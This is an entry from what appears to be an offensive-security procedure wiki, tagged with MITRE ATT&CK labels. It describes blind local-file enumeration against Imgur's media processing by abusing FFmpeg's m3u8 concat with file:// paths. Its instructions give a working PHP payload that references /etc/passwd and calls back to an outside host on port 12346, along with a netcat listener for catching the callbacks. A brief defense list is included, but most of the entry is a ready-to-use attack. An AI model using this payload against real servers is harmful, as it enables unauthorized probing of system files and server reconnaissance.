---
id: proc-imgur-file-enum-001
tags:
  - file-enumeration
  - lfi
  - concat
type: procedure
tools:
  - '[[tools/nc]]'
tactics:
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:37.535Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Perform-Local-File-Enumeration-via-CONCAT

## Summary

This procedure modifies the m3u8 payload to use CONCAT with file:// protocol, allowing blind enumeration of local files on Imgur's server by checking for success/failure in processing.

## Description

FFmpeg's m3u8 support enables CONCAT of local files via file://. If the file exists, processing succeeds and triggers a request to the attacker's server; if not, it fails silently. This allows enumerating paths like /etc/passwd or /etc/issue.

## Requirements

1. Working SSRF setup from previous steps
2. Netcat listener active
3. List of target files/paths to enumerate

## Defense

Defensive measures and detection strategies:

- Disable or restrict file:// protocol in ffmpeg configurations
- Monitor ffmpeg logs for access to sensitive paths
- Implement file access controls in media processing sandbox

## Objectives

1. Blindly detect local file existence
2. Enumerate system files
3. Gather server information

## Instructions

### Step 1: Update m3u8 Payload for CONCAT

**Context**: Modify PHP to output m3u8 with file:// concat.

Update PHP script:

```php
<?php
header('Content-Type: video/avi');
echo '#EXTM3U\n#EXT-X-PLAYLIST-TYPE:VOD\n#EXT-X-TARGETDURATION:1\n#EXT-X-VERSION:3\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:file:///etc/passwd|http://gradeco.ru:12346/\n#EXT-X-ENDLIST\n';
?>
```

> Save and test serving. Submit URL as before.

### Step 2: Monitor for Success

**Context**: Check netcat for incoming connection indicating file existence.

Run [[commands/nc-listen-port]] and submit payload.

```bash
nc -v -l 12346
```

> Expected output: Connection if /etc/passwd exists (success), no connection if not. Iterate for other files.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/nc]]

## Tags

- enumeration
- local-files
- blind
